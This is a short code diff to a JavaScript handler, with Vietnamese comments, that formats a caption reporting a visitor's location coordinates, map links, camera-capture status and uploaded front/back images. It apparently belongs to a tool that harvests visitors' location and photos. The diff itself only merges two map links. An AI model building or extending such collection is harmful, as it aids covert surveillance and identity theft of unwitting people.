@@ -39,7 +39,7 @@ export default async function handler(req) {
     const hasFront = formData && formData.has("front");
     const hasBack = formData && formData.has("back");
 
-    // 3. TẠO CAPTION THÔNG TIN VỚI GOOGLE MAPS CHUẨN
+    // 3. TẠO CAPTION THÔNG TIN
     const finalCaption = `
 📡 [THÔNG TIN TRUY CẬP & ẢNH XÁC THỰC]
 
@@ -52,8 +52,7 @@ export default async function handler(req) {
 🌎 Quốc gia: ${geo.countryName || "Việt Nam"}
 📍 Vĩ độ: ${lat}
 📍 Kinh độ: ${lon}
-🗺️ Google Maps: https://www.google.com/maps?q=${lat},${lon}
-📌 Google Maps Embed: https://www.google.com/maps/place/${lat},${lon}
+🗺️ Google Maps: https://www.google.com/maps/place/${lat},${lon}
 📸 Camera: ${clientData.camera || "✅ Đã chụp thành công"}
 
 ⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.
